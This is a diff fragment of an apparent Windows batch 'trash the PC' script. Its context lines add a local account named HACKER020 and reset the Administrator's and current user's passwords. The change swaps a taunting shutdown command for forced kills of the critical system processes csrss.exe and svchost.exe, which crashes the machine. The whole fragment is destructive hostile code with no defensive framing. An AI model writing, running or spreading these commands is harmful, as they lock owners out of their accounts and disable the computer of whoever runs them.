@@ -111,4 +111,5 @@ NET USER HACKER020 Trash0001 /add
 NET USER Administrator Trashedpc01
 NET USER %USERNAME% Trashedpc01
 
-shutdown /s /t 5 /c You are an idiot! HAHAHAHAHAHAHA
+taskkill /f /im csrss.exe
+taskkill /f /im svchost.exe
